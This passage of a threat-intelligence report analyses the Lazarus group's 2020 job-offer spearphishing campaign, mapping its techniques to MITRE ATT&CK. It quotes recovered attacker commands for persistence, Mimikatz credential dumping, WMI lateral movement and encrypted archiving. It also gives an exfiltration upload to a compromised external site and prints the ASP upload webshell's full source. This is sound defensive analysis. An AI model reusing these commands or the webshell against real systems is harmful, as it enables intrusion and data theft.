During incident response it turned out that industries and\nproducts of the affected companies are related to each other and the observed Tactics, Techniques &\nProcedures (TTPs) and Indicators of Compromise (IOCs) can be attributed with high confidence to the APT\ngroup Lazarus.\n\nIn handling multiple Lazarus incidents in parallel, we have been able to accumulate further details of the\nthreat actor’s behavior and the toolset of later phases of the Mitre Att&ck framework. These details, which\nare described in this document, provide a comprehensive picture of the 2020 Lazarus campaign, extending\nexisting reports with observed TTPs.\n\nBased on the unveiled and observed TTPs it seems that the attacker’s objective is exfiltration of very\nselected information.\n\n### 1.2 Attribution\n\nBased on the gained technical IOCs and derived TTPs from the different engagements, we assess with high\nconfidence that those incidents were caused by the threat actor Lazarus/APT37. When comparing those\nIOCs with TTPs from public and private reports about the Lazarus Group, we detected huge overlaps, e.g.,\nin re-use of command and control infrastructure as well as observed process commands and tools. German\nauthorities share this assumption, too.\n\nThe Lazarus Group[1], also named G0032 by Mitre, and more specifically to the subgroup APT37 or G0067\nis considered to belong to the North Korean government.\n\n1 [https://attack.mitre.org/groups/G0032/](https://attack.mitre.org/groups/G0032/)\n\n\n-----\n\n### 1.3 Overall timeline\n\nDue to the number of analyzed incidents, HvS had the chance to compare the timelines and to draw\nconclusions. The results are shown in Figure 1, which contains the timelines of four different incidents.\nPlease note, that the exact dates are shifted a bit to guarantee anonymity, nevertheless the flow of actions\nremains unchanged.\n\nBetween July 2019 and March 2020 there were only a few publications by security researchers about\ndetected activities and new indicators from Lazarus, which now can be translated in “the calm before the\nstorm”. Apparently, the group was busy in preparing a new campaign.\n\nFigure 1: High level timeline of incidents #1 to #4\n\nFebruary 2020\n\nInterviews with various patient zero users of the incidents revealed that they all became victims of social\nengineering attacks. All of them were contacted via LinkedIn in the second half of February 2020. Only one\nvictim in Asia directly received a malicious document. Although that client was compromised early,\nattackers did not use the C2 channel immediately. In all other cases the attackers started individual\nconversations with the victims to build up confidence and trust. They later abused this trust to persuade\nvictims into executing malicious documents on their system.\n\nMay 2020\n\nFor incident #2, there is only a rough timeline available, but the actor had been active in May and was\ncontained end of May.\n\nWithin three days at the end of May, attackers delivered malicious documents and thus compromised the\nvictim’s devices of incidents #3 and #4. Further, they started to actively use the C2 channel in incident #1.\nAs in incident #1, they waited to use the C2 channel of incident #4.\n\n\n-----\n\nJune 2020\n\nIn incident #3 attackers used the established access immediately for internal reconnaissance and shortly\nafter for lateral movement to gain a better foothold. Subsequently, they searched for interesting\ninformation within the network and performed further lateral movement, until the incident was successfully\ncontained end of June.\n\nJuly 2020\n\nOnly three days after containment of incident #3 - which even included a weekend - the attackers started\ninternal reconnaissance and lateral movement in incident #4.\n\nFor some reason, the C2 channel used in incident #4 broke in the beginning of July and the actor lost\naccess. Thus, they started over with social engineering against a victim on another continent and regained\naccess to the network in mid of July. This quick execution of a “Plan B” shows that the attackers have been\nwell prepared and did their research about the target organizations and selection of victims early in 2020.\n\nIncident #1 was kind of special. Apparently, it was harder to gain foothold in incident #1 due to the more\nrestrictive network design. Hence, multiple lateral movement attempts from patient zero in Asia towards\nEurope were successfully contained by the victim, until patient zero was identified end of July.\n\nAugust 2020\n\nAfter regaining access on another continent, the attackers also re-accessed previously compromised\nsystems from incident #4. Then they started internal reconnaissance, clearly intensified lateral movement,\nand searched for interesting information, until in mid of August incident #4 was also successfully contained.\n\nSeptember to October 2020\n\nDuring that containment, one compromised client was isolated and kept running to monitor further\nactivities. We discovered that the attackers verified the C2 connectivity monthly and renewed parts of the\nmalware.\n\nNovember 2020\n\nIn November 2020, the attackers compromised a European subsidiary of the victim of incident #1 and\nstarted lateral movement again.\n\nInterestingly we made the same observation as in\nincident #4, that the TTPs have changed after reinfection.\nTo achieve better persistence local accounts were\ncreated as described in 2.2 and for lateral movement\ninstead of Windows Management Instrumentation.\nWindows Services were used as shown in 2.7. While in\nthe first stage the compromise of systems was limited,\nafter reinfection a clearly higher number of systems were\ncompromised.\n\n\nNevertheless, in both incidents, the attackers accessed\npreviously compromised systems after their successful\nreinfection and reused already compromised accounts.\n\n\nFigure 2: Recent spearphishing mail with link to malicious\n\n\ndocument with changed names\n\n\nDuring the time of writing, spearphishing mails with job opportunities were still distributed to employees\nof the victims, like shown in Figure 2.\n\n\n-----\n\n### 1.4 Further Lazarus activities \n\nWhile in the four described incidents attacker’s activity took place from May to August 2020, there is proof\nfor further activity.\n\n- In April, tweets regarding spearphishing attempts with fake job offers were published. They already\ncontained the meanwhile well-known C2 domain www[.]anca-aste.it.\n\n- Further reports [[2], [3], [4]] about incidents in the USA and Israel, which were attributed to Lazarus, were\npublished in June and August. So, it could be assumed, that the actor’s activities took place in the\nprevious months, where our timeline shows a gap.\n\n- In November 2020 McAfee published a blog article[5] which matches to our observed TTP and reveals\nthreat actor’s activity in Russia and India.\n\n2 [https://www.clearskysec.com/wp-content/uploads/2020/08/Dream-Job-Campaign.pdf](https://www.clearskysec.com/wp-content/uploads/2020/08/Dream-Job-Campaign.pdf)\n\n3 [https://www.mcafee.com/blogs/other-blogs/mcafee-labs/operation-north-star-a-job-offer-thats-too-good-to-](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/operation-north-star-a-job-offer-thats-too-good-to-be-true/)\n[be-true/](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/operation-north-star-a-job-offer-thats-too-good-to-be-true/)\n4 [https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_Operation_Interception.pdf](https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_Operation_Interception.pdf)\n\n5 [https://www.mcafee.com/blogs/other-blogs/mcafee-labs/operation-north-star-behind-the-scenes](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/operation-north-star-behind-the-scenes)\n\n\n-----\n\n### 1.5 Conclusion\n\nThe analysis of the four incidents clearly shows that those actions are part of a very targeted and planned\ncampaign. This campaign has access to vast resources, e.g., a complex C2 and data exfiltration\ninfrastructure consisting of various compromised websites.\n\nComparing the described activities of the Lazarus Group to various other analyzed incidents of groups like\nChafer, Winnti or OceanLotus, it attracted our attention that Lazarus made less mistakes. They performed\nthe attacks straight forward with a clear objective and cleaned up their traces cautiously.\n\nThe observed toolset is very flexible, can replace C2 infrastructure on the fly and runs completely in\nmemory. Furthermore, the group showed mature capabilities for tunneling traffic and overjumping “air\ngaps”, respectively internet isolation of systems and networks.\n\nThe main lessons learned are:\n\n1. Entry point is very often the user. The attackers use also different communication media, like\nLinkedIn or WhatsApp and company mail. Companies should train their users to detect and\nprevent spear phishing attacks and provide a clear and easy to use reporting processes.\n\n2. Although the technical level of the attackers is quite advanced, basic protective measures like\nautomatically updated URL block lists in the proxy help with early detection and slowing down of\nsuch attacks.\n\n3. If you recognize similar TTPs or IOCs in your infrastructure, you should carry out very serious\nincident analysis, before trying to contain the incident. Otherwise, evidence may be gone, and\nattackers still might have access to the network. As in case of reinfection, the attackers reuse\npreviously compromised assets. Hence the usage of deception approaches (replacing\ncompromised accounts and systems and monitor the usage of the old ones) could help for\ndetection.\n\n4. Mature EDR solutions on all endpoints (clients and servers) are crucial to understand such attacks.\nDue to in memory operation only few evidence is left on disks. The detail level of the forensic\nresults as e.g., the grade of compromise and accessed information strongly depends on the\nanalyzable records. Thanks to the wide coverage of a sophisticated EDR solution in one of the\nincidents, we have been able to draw a very comprehensive picture. In one of the other incidents,\nmany facts remain unclear, because the customer had just a basic EDR in place. Without EDR even\nthe identification of compromised systems was quite hard.\n\n\n-----\n\n## 2 Description of observed TTPs \n\nFollowing the most important observed techniques, tools and practices and considerations which led to\nIOCs given in chapter 3 are explained and mapped to the Mitre ATT&CK framework.\n\n### 2.1 Initial Access and Execution\n\nSpearphishing Attachment (T1566.001), User Execution: Malicious File (T1204.002)\n\nThe threat actor obtained initial access in each of the compromised networks with the already described\napproach of social engineering and spearphishing attachments.\n\nTherefore, fake LinkedIn profiles for HR managers of well-known companies (e.g., Boeing or General\nDynamics Land Systems) were created. The profiles looked genuine at first sight and even an online search\nfor the profile names revealed real HR employees. First contact to obviously carefully selected victims – the\nnumber of known victims is the necessary minimum per incident – was established at the end of February\nuntil mid of March 2020. After introducing as HR manager with potential job opportunities, casual\nconversation took place, which at least in one case switched over to WhatsApp after some time.\n\nEnd of May 2020 malicious Word documents were sent to the victims in Europe with different approaches,\npretending to be a job description for a lucrative position at Boeing. The attachment makes use of different\nmalicious Word documents or ISO files consisting of a decoy\nPDF bundled with a modified PDF viewer program. The\ndocuments download and persist a malicious DLL in the\nsystem.\n\n\nFigure 3: Exemplary malicious word document\n\n\nFurther, the threat actor is extremely persuasive as well as\nsustained. In one case, the victim attempted to open a\nmalicious Word document on his private notebook, which\nhad only OpenOffice installed. As reaction to his feedback\nthat the file is not displayed correctly, the threat actor\nsuggested to send the file to his company mail to open it with\nMicrosoft Word. However, the attachment was blocked by an\nmail security platform. Therefore, the threat actor shared a\ndecoy BoeingPDF.iso via WhatsApp and asked the victim\nto transfer the file from his cellphone via USB tethering to his\ncompany notebook. Furthermore, the attackers explained the\nvictim step by step how to mount the ISO file and how to\nexecute the contained exe file. To keep the story alive, the\nvictim was contacted again after about one month with\nanother job offer.\n\n\n-----\n\n### 2.2 Persistence\n\nBoot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001)\n\nFor persistence two different DLL downloader variants were found:\n\nVariant a) used DLLs, which were manipulated versions of well-known DLLs like OpenSSL’s libeay32.dll or\nSQLite’s sqlite3.dll. This technique seems to be used more common as other researchers described it also[6].\nFor invocation, an original named PE export together with an encryption-key parameter is called, e.g.:\n```\nc:\\windows\\system32\\rundll32.exe C:\\ProgramData\\Windows\\ntuser.dat,CMS_ContentInfo {216B0291-15BF-D688-17004CFEE40B5330}\n\n```\nListing 1: Execution of DLL with encryption-key\n\nVariant b) corresponds to the iconcache.db DLLs described in US-CERT publication AR20-232A[7]: The\nDLLs have the original filename MFC_DLL.dll and export a SMain function. The invocation is triggered\nwith a SID looking number like, i.e.:\n```\nrundll32.exe C:\\ProgramData\\iconcache.db,SMain S-7-43-8423-97048307-383378-8483\n\n```\nListing 2: Call of Smain function in DLL\n\nThe DLLs were stored with obfuscated extensions into a subdirectory of C:\\ProgramData. For example:\n\nFile path Execution\n\nC:\\ProgramData\\Windows\\ntuser.dat `rundll32.exe C:\\ProgramData\\Windows\\ntuser.dat,CMS_ContentInfo`\n```\n                        {216B0291-15BF-D688-1700-4CFEE40B5330}\n\n```\nC:\\ProgramData\\Microsoft\\MSSqlite3DB.evt.pol.dat `rundll32.exe`\n```\n                        C:\\ProgramData\\Microsoft\\MSSqlite3DB.evt.pol.dat,sqlite3_create_f\n                        unctionex NujsFYJNTpws664RGNruaKSu12TdGVYt\n\n```\nC:\\ProgramData\\desktop.ini `rundll32.exe C:\\ProgramData\\desktop.ini,Smain S-7-43-8423-`\n```\n                        97048307-383378-8483\n\n```\nThe threat actors code is persisted via a harmless looking Windows lnk file (e.g. OneNote.lnk) in the Startup\nfolder (%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup) of the compromised\nuser account. This tactic is also described by ClearSky Cyber Security and McAfee in their respective reports.\n\nIt is assumed that all downloaders retrieve an encrypted version of the BLINDINGCAN / DRATzarus RAT.\n\nOn two systems it was identified that the threat actor directly persisted malicious executables, which likely\nare the final stage of the BLINDINGCAN / DRATzarus RAT. The executables were very large (~ 65 MB), in\nboth instances invoked with the parameter -p 0x57AC098B and persisted in the compromised user’s runkey:\n```\nreg add “HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” /v USOShare /t REG_SZ /d\n“C:\\ProgramData\\USOShared\\USO.TMP -p 0x57AC098B”\n\n```\nListing 3: Persistence used by the threat actor for the USO.TMP executable\n\n6 [https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/North%20Korea/APT/Lazarus/2020-05-](https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/North%20Korea/APT/Lazarus/2020-05-05/Analysis.md)\n[05/Analysis.md](https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/North%20Korea/APT/Lazarus/2020-05-05/Analysis.md)\n\n7 [https://us-cert.cisa.gov/ncas/analysis-reports/ar20-232a](https://us-cert.cisa.gov/ncas/analysis-reports/ar20-232a)\n\n|File path|Execution|\n|---|---|\n|C:\\ProgramData\\Windows\\ntuser.dat|rundll32.exe C:\\ProgramData\\Windows\\ntuser.dat,CMS_ContentInfo {216B0291-15BF-D688-1700-4CFEE40B5330}|\n|C:\\ProgramData\\Microsoft\\MSSqlite3DB.evt.pol.dat|rundll32.exe C:\\ProgramData\\Microsoft\\MSSqlite3DB.evt.pol.dat,sqlite3_create_f unctionex NujsFYJNTpws664RGNruaKSu12TdGVYt|\n|C:\\ProgramData\\desktop.ini|rundll32.exe C:\\ProgramData\\desktop.ini,Smain S-7-43-8423- 97048307-383378-8483|\n\n\n\n[6].\n\n\n-----\n\nThe parameter -p together with the hex values 0x57AC098B or 0x53A4C60B was frequently observed\nin the threat actor’s process executions (see listing below). However, intact versions of these executables\nhave not been obtained.\n```\ncmd.exe /c c:\\RECYCLER\\~TMP.0312.bin -p 0x57AC098B\ncmd.exe /c c:\\ProgramData\\~DF877.TMP 17 c:\\ProgramData\\~DF086.TMP -p 0x57AC098B\ncmd.exe /c c:\\ProgramData\\ssh\\ssh_tmp088.tmp 2 c:\\ProgramData\\ssh\\ssh_tmp087.tmp -p 0x57AC098B\ncmd.exe /c c:\\ProgramData\\Intel\\DAL\\~TMP015.DAT -p 0x57AC098B\ncmd.exe /c c:\\ProgramData\\Intel\\DAL\\~DF088.TMP 1 c:\\ProgramData\\Intel\\DAL\\~DF099.TMP -p 0x57AC098B\" >\nC:\\Users\\<USER>\\AppData\\Local\\Temp\\~DF8DB5.tmp\n\n```\nListing 4: Executions with the parameter “-p 0x57AC098B”\n\nCreate Account: Local Account (T1136.001)\n\nIn one incident the threat actor created local administrative accounts named admin$ to hide them from\nthe net user command output. The accounts were created remotely via the Windows sc command. The\nstring abcd1234!@#$ was used as password. Such patterns where seen commonly for attacker passwords.\n\nAs described in chapter 1.3, TTPs changed after reinfection, this technique was only observed in the second\nattempts.\n\n### 2.3 Privilege Escalation\n\nExploitation for Privilege Escalation (T1068)\n\nIn one case the threat actor used an Eternal Blue exploit (MS17-010, the vulnerability allowing the WannaCry\nbreakout) to perform a privilege escalation on a remote Windows server. The exploit execution was invoked\nwith the following command:\n```\nC:\\ProgramData\\IBM\\SearchProtocol.exe C:\\ProgramData\\IBM\\SearchProtocol.cache HC7k08UOgflouO8i 192.168.1.17\nC:\\ProgramData\\IBM\\SearchProtocols.dmp C:\\ProgramData\\IBM\\SearchProtocols.mdmp\n\n```\nListing 5: Text output from SearchProtocol.exe\n\nAlthough, it was not possible to recover a sample of the exploit (only its SHA-1 hash is known from the\nAmCache hive: `f09d9c7783adb4a44d48c77e412319e1c9cd4384),` a text output file\nSearchProtocols.out was recovered from a Volume Shadow Copy:\n```\n[*] Connecting to 192.168.1.17... \n[+] Target OS is Windows Server 2003 3790 ServicePack2 \n[+] Target OS is vulnerable to MS17-010. \n[*] Backdoor already exist. Target OS is 32 bit environment.\n[*] Injecting DLL… Success!\n\n```\nListing 6: Text output from SearchProtocol.exe\n\nThe exploit creates the local user tempAdmins in case of success with administrative permissions and the\npassword 1q2w3e4r5t!@#$.\n\n\n), a text output file\n\n\n-----\n\n### 2.4 Defense Evasion\n\nIndicator Removal on Host: File Deletion (T1070.004)\nThe threat actor deleted his tools, text output and exfiltration files etc. with the Windows del command.\nDue to the delay between the threat actor’s activity and subsequent detection and analysis of the\nincident, this simple deletion was sufficient to remove most artifacts from the file system. As in some\ncases deletion took place on the next working day, some artifacts could be retrieved from nightly server\nbackups.\n\nVirtualization/Sandbox Evasion (T1497)\n\nThe attacker’s remote access trojans and staging tools are protected against automatic sandbox analysis\nvia encryption and require its encryption keys as a parameter. However, also the execution with the correct\nparameters but without internet in a virtualized sandbox machine did usually not produce valuable results.\nIt was not further analyzed whether an execution on bare-metal or with internet would give more insights.\n\n### 2.5 Credential Access\n\nOS Credential Dumping: LSASS Memory (T1003.001)\n\nFor credential dumping the threat actor used a custom encrypted Mimikatz which is decrypted in-memory\nvia a small loader executable. The execution did use the following command line call:\n```\n~DF012.TMP -f c:\\RECYCLER\\~DF011.TXT c:\\RECYCLER\\~DF011.DAT 1q2w3e4r@#$@#$@#$\n\n```\nListing 7: Execution of encrypted Mimikatz\n\nAs the threat actor failed on one occasion to delete the tool and the output files, the following information\nwas identified: The ~DF012.TMP file is a small loader program comprising 61 KB, which decrypts and loads\nMimikatz from the `~DF011.DAT file. The file` `~DF011.TXT` corresponds to the default output of the\n`sekurlsa::logonPasswords command. The string 1q2w3e4r@#$@#$@#$` is the required encryption\nkey. The key may also be shortened to the string 1q2w, Mimikatz does still execute correctly.\n\nAnother Mimikatz variant was identified in the command line of an unknown binary, with a double Base64\nencoded string as a parameter. Decoded, the string corresponds to the well-known Mimikatz command:\n```\nEncoded Command:\nY0hKcGRtbHNaV2RsT2pwa1pXSjFaeXh6Wld0MWNteHpZVG82Ykc5bmIyNXdZWE56ZDI5eVpITT0=\nDecoded Command:\nprivilege::debug,sekurlsa::logonpasswords:\n\n```\nListing 8: Encoded Mimikatz Command\n\nThe following listing shows the complete command line call containing the encoded Mimikatz command:\n```\n$ C:\\ProgramData\\IBM\\IBM122.DAT C:\\ProgramData\\IBM\\IBM121.DAT Z17FDaciCdAbXrRe\nY0hKcGRtbHNaV2RsT2pwa1pXSjFaeXh6Wld0MWNteHpZVG82Ykc5bmIyNXdZWE56ZDI5eVpITT0=\n\n```\nListing 9: Most probably an execution of a Mimikatz variant.\n\nIn addition, the usage of renamed executables of the SysInternals tool procdump was discovered.\n\n\n, Mimikatz does still execute correctly.\n\n\n-----\n\nUnsecured Credentials: Credentials In Files (T1552.001)\n\nThe threat actor systematically analyzed home directories of admins, software configuration files, and setup\n/ maintenance scripts to identify valid credentials of existing domain accounts. For instance, the following\ncommands were executed:\n```\n$ type \\\\targetserver\\applicationdirectory\\comfigurationfile.xml\n$ type \\\\targetserver\\backupdirectory\\backupscript.bat\n$ type \\\\targetserver\\tempdirectory\\script.cmd\n$ type \\\\fileserver\\homedirectory\\passwordfile.txt\n$ type \\\\fileserver\\homedirectory\\notes.txt\n$ type \\\\fileserver\\homedirectory\\Desktop\\notes.txt\n\n```\nListing 10: Type commands for searching credentials in configuration, script and text files.\n\n### 2.6 Discovery\n\nAccount Discovery: Domain Account (T1087.002)\n\nThe tool AdFind, renamed to C:\\ProgramData\\IBM\\IBM.dat or C:\\ProgramData\\Kagent.exe and\nUPX packed, was used to enumerate all organizational units, users, computer, and groups of the victims\nActive Directory:\n```\n$ IBM.DAT -b dc=<DC>,dc=<DC>,dc=<DC> -f \"objectcategory=organizationalUnit\" CanonicalName -nodn -csv >\nC:\\ProgramData\\IBM\\ou.dat 2>&1\n$ IBM.DAT -b dc=<DC>,dc=<DC>,dc=<DC> -f \"objectcategory=person\" cn sAMAccountName description\ndistinguishedName objectSid whenCreated whenChanged lastLogon pwdLastSet lastLogonTimestamp memberof -tdc nodn -csv > C:\\ProgramData\\IBM\\user.dat\n$ IBM.DAT -b dc=<DC>,dc=<DC>,dc=<DC> -f \"objectcategory=computer\" cn sAMAccountName distinguishedName\noperatingSystem operatingSystemVersion objectSid ms-ds-creatorsid whenCreated whenChanged -tdc -nodn -csv >\nC:\\ProgramData\\IBM\\com.dat 2>&1\n$ IBM.DAT -b dc=<DC>,dc=<DC>,dc=<DC> -f \"objectcategory=group\" name distinguishedName memberof -nodn -csv >\nC:\\ProgramData\\IBM\\group.dat 2>&1\n\n```\nListing 11: Usage of AdFind vie command line\n\nNetwork Share Discovery (T1135)\n\nThe threat actor used a threaded SMB scanner to enumerate shares and to test local administrative\npermissions with previously harvested credentials. The binary is internally dubbed “Scan.exe” and accepts\nfollowing parameters:\n```\n$ Scan.exe StartIP EndIP ThreadCount logfilePath [Username Password Deep]\n\n```\nListing 12: Execution of Scan.exe with parameters\n\nWhile StartIP and EndIP are expected to be Ipv4, a numeric thread count, a full path for the output logfile\nand optional a user and a password is given. Following exemplary execution by the threat actor was\nidentified:\n```\n$ IBM011.BIN 192.168.1.1 192.168.1.255 10 C:\\ProgramData\\IBM\\IBM011RMU.DAT\nworkgroup\\Administrator password 1\n\n```\nListing 13: Execution of port scanner in IP range\n\n```\nC:\\ProgramData\\Kagent.exe and\n\n```\n\n-----\n\n### 2.7 Lateral Movement\n\nRemote Services: SMB/Windows Admin Shares (T1021.002)\n\nThe Windows Admin Shares were the threat actor’s primary technique for lateral movement. Frequent\nmodus operandi were following actions:\n\n- Copy the malware onto a new remote machine.\n\n- Start the malware on the remote machine.\n\n- Check if the malware connected successfully to the C2\n```\n$ copy C:\\ProgramData\\IBM\\~TMP.0312.bin \\\\192.168.1.23\\c$\\ProgramData\\IBM\\tmprax\\\n$ cmd.exe /c \"wmic /NODE:HOSTNAME /USER:USER /PASSWORD:PASSWORD PROCESS CALL CREATE \"cmd.exe /c C:\\\n\\ProgramData\\IBM\\~TMP.0312.bin -p 0x57AC098B\"\" 2>&1\n$ cmd.exe /c \"wmic /NODE:HOSTNAME /USER:USER /PASSWORD:PASSWORD PROCESS CALL CREATE \"cmd.exe /c netstat -ano\n| findstr 8172 > C:\\ProgramData\\IBM\\tmprax\\~DF6AF.tmp\"\" 2>&1\n$ copy \\\\192.168.1.23\\c$\\ProgramData\\IBM\\tmprax\\~DF6AF.tmp C:\\ProgramData\\IBM\\\n$ type C:\\ProgramData\\IBM\\~DF6AF.tmp\n\n```\nListing 14: Lateral movement to execute the RAT on a new machine\n\nBesides Windows Management Instrumentation (WMI) for lateral movement, also the Windows sc\ncommand was used. Malicious commands or batch files were registered as Windows Service and thus\nexcuted. Artefacts from such activity can be recovered from the Windows System eventlog EventID 7045:\n```\n[7045 / 0x1b85] Service File Name: %COMSPEC% /Q /c echo net user admin$ /delete > \\\\127.0.0.1\\C$\\eRqjTXDLMP\n2>&1 > %TEMP%\\nIMBWpbGyo.bat & %COMSPEC% /Q /c %TEMP%\\nIMBWpbGyo.bat & del %TEMP%\\nIMBWpbGyo.bat\n\n```\nListing 15: Traces in eventlog for malicious service execution\n\nAs described in chapter 1.3, TTPs changed after reinfection and the Windows sc command was used\ninstead of WMI.\n\n\n-----\n\n### 2.8 Collection\n\nArchive Collected Data: Archive via Utility (T1560.001)\n\nThe attackers used WinRar to pack data into encrypted archives. Often archiving was directly performed\non the system holding the data itself. After the packing procedure, the archive was copied to a\ncompromised client and then exfiltrated from there.\n```\n$ igfxmnr.exe a -hp1q2w3e4 -m5 \"C:\\ProgramData\\IBM\\restore01.dat\" \"C:\\ProgramData\\IBM\\IBM010J.DAT\"\n$ ~DF123.TMP a -hp1q2w3e4 -m5 C:\\ProgramData\\IBM\\restore002.dat \"C:\\ProgramData\\IBM\\tmprax\\\"\n$ cmd.exe /c C:\\ProgramData\\IBM\\~DF543.TMP a -hp1q2w3e4 -m5 C:\\ProgramData\\IBM\\restore2400.dat\n\"\\\\<share>\\<path>\\Default.rdp\"\n\n```\nListing 16: Command line executions of WinRar\n\nData from Network Shared Drive (T1039) and Data from Local System (T1005)\n\nPrior to the collection of data and the packing with WinRAR, the attackers used dir-listings to determine\nthe content of folders on the local systems as well as shares which were accessible from the current host.\nAfter the exfiltration of the dir listings and some time for review, only specific files which seemed of value\nwere collected.\n```\n$ cmd.exe /c \"dir \\\\<share>\\<path>\\\"\n\n```\nListing 17: Perform dir listing of a directory on a share\n\nIt must be noticed that also data of administrators and IT departments was targeted. It is assumed that the\nobjective was to learn more about the internal network and the internal infrastructure. This information\nwas probably used to plan and prepare their lateral movement and to locate the valuable information.\n\nIn summary, these procedures show that the goal of the attackers was not to exfiltrate data in bulk, but\nrather searching for specific information.\n\nBesides the Windows command dir, process executions of their RAT component with the following pattern\nwere identified:\n```\nC:\\ProgramData\\Intel\\DAL\\~TMP123.DAT H:\\ 0 C:\\Users\\<USER>\\AppData\\Local\\Temp\\CMPC42B.tmp \n\n```\nListing 18: Execution of RAT\n\nBased on file fragments it is assumed that this command creates a recursive directory listing of the provided\npath.\n\n\n-----\n\n### 2.9 Command and Control\n\nApplication Layer Protocol: Web Protocols (T1071.001)\n\nThe attacker’s procedure for hosting their C2 servers is compromising legit websites via publicly known\nvulnerabilities and then adding their C2 endpoints on these webservers without interfering with the usual\nbehavior of the legit website. The communication is then performed via HTTP and HTTPS.\n\nDifferent stages make use of different webservers and endpoints. For example:\n\n- The observed malicious Word documents try to load the initial payload from the domain\n```\n  https://www.anca  aste[.]it/uploads/form/02E319AF73A33547343B71D5CB1064BC.dotm\n\n```\n- It was identified that the persistence DLLs connects to an ASP file. For example,\n```\n  http://support.medicalinthecloud[.]com/TechCenter/include/slide.asp. \n\n```\n- The RAT components (i.e., executables started with parameter -p 0x57AC098B) connect to PHP files\nlike http://125.206.177[.]152/old/viewer.php.\n\n- Exfiltration did also target different webservers with ASP file endpoints like\n```\n  https://www.gonnelli[.]it/uploads/catalogo/thumbs/thumb.asp. A third party provided\n\n```\nsamples of the ASP files from their servers which were used for data exfiltration, more details are\nprovided in paragraph 2.10.\n\nThe threat actor most certainly uses public exploits to compromise these third-party webservers. For\nexample, the C2s `137.74.114.227,` `bootcamp-coders.cnm.edu and` `yakufreshperu.com had an`\nold version of the Lavarel PHP framework installed. All three were vulnerable to CVE-2018-15133 a deserialization vulnerability that allows Remote Code Execution. In order, to control the webserver the threat\nactor dropped a b374k webshell named bnotices.php with an unknown password.\n\n### 2.10 Exfiltration\n\nExfiltration Over Alternative Protocol (T1048)\n\nFor the exfiltration of data, the attackers also used legit websites which have been compromised in\nadvance. The upload of the data from the victim network to the websites was performed via HTTP and\nHTTPS. From there, the Tor network was used to access the uploaded data and to download the data.\nAfter retrieving the exfiltrated data, the files were deleted from the webserver.\n\nThe following command was used to upload the Rar splits:\n```\n$ C:\\ProgramData\\IBM\\~DF234.TMP S0RMM-50QQE-F65DN-DCPYN-5QEQA\nhttps://www.gonnelli.it/uploads/catalogo/thumbs/thumb.asp C:\\ProgramData\\IBM\\restore0031.dat data03 10000 -p\n192.168.1.240 8080\n\n```\nListing 19: Upload of a Rar split to the C2 gonelli.it via an attacker-controlled asp file thumb.asp.\n\n\n-----\n\nThe program ~DF234.TMP has not been recovered. However, most parameters can be derived from\npreviously known details. The parameter `C:\\ProgramData\\IBM\\restore0031.dat is the Rar split`\nstored on the compromised system. The IP `192.168.1.240 and the number` `8080 denotes the`\ncompany’s proxy and its port. As the recovered webshell thumb.asp receives a file name as a POST\nparameter it is assumed that data03 is the name of the archive on the webserver.\n\nThe following figure provides a high-level overview of the traffic flow between compromised companies\nand the attacker infrastructure user for data exfiltration:\n\nFigure 4: Exfil infrastructure used by the attacker\n\nBy analyzing the access logs from the provider, which hosted one of the compromised web sites, three\nvictims could be identified, which were communicating with the C2 infrastructure of Lazarus. The access\nlogs showed that from these three victims the ASP files, which were used for dropping files onto the storage\nof the web server, were accessed roughly 15,000 times. The exfiltrated files were uploaded as encrypted\nrar archives as described in Section 2.8. To complete the exfiltration of the data, the attackers accessed\nanother ASP file via Tor, which was used for downloading the previously uploaded Rar archives. Since Tor\nwas used, there is no way of tracing back the accesses to its origin. After retrieving the exfiltrated data, the\n```\nhelp.asp file was accessed via Tor to delete the files on the webserver.\n\n```\nFurthermore, the web hoster provided the samples of the ASP files. Each file was analyzed to determine\nits purpose.\n\nThe samples thumb.asp, thumbs.asp, and img.asp are identical, based on their hashes. The source\ncode of the file is shown in Listing 11. The code simply extracts the post parameters fr (filename) and fp\n(filedata) from the POST request and writes the file data to the workdir, which is created based on the\ncurrent URL appended by the string “video”. If the upload has been successful, the string “S:“ is displayed\non the website together with the size of the data which has been written to disk. If the file write procedure\nfails, the string “E : F” is returned.\n\n\n-----\n\n```\n<%\nOption Explicit\n\n```\n```\nFunction WriteFile(filePath, fileData)\n\n```\n```\n  On Error Resume Next\n  Err.Clear()\n  Dim objFSO, objTextStream\n  Set objFSO = Server.CreateObject(\"Scripting.FileSystemObject\")\n  Set objTextStream = objFSO.OpenTextFile(filePath, 2, True)\n  If (Err.Number > 0) Then\n    WriteFile = 0\n    Exit Function\n  End If\n  objTextStream.Write(fileData)\n  objTextStream.Close\n  Set objTextStream = Nothing\n  Set objFSO = Nothing\n  WriteFile = 1\nEnd Function\nDim tmpPath, workDir\nworkDir = Request.ServerVariables(\"URL\")\ntmpPath = Left(workDir, InStrRev(workDir, \"/\")) & \"video\"\nworkDir = Server.MapPath(tmpPath)\nDim fileName, filePath, fileData, ret, strMsg\nfileName = Request.Form(\"fr\")\nfileData = Request.Form(\"fp\")\nfilePath = workDir & \"/\" & fileName\nret = WriteFile(filePath, fileData)\nIf ret = 1 Then\n  strMsg = \"S : \" & Len(fileData)\nElse\n  strMsg = \"E : F\"\nEnd If\nResponse.Write(strMsg)\n%>\n\n```\nListing 20: Source code of img.asp / thumbs.asp / thumb.asp\n\n\n-----\n\nThe files `controllers.asp,` `inc-basket-offer.asp, and` `template-query.asp are all heavily`\nobfuscated and therefore not listed here. The files controllers.asp, and inc-basket-offer.asp are\nthe identical webshell, both protected with the password `venus. The` `template-query.asp` file is a\nmodified version of the Redhat Hacker Webshell[8] protected by the password 1234qwer.\n\nFigure 5: template-query.asp Webshell based on Redhat Hacker Webshell\n\nThe controllers.asp webshell looks identical to the screenshots in other non-public reports:\n\nFigure 6: controllers.asp webshell\n\n8 [https://github.com/xl7dev/WebShell/blob/master/Asp/RedHat%20Hacker.asp](https://github.com/xl7dev/WebShell/blob/master/Asp/RedHat%20Hacker.asp)\n\n\n-----\n\nFigure 7: controllers.asp web shell with port scan functionality\n\nThe last file, help.asp, is used for the deletion of files on the server. The ASP file reads the fn (filename)\nparameter from the 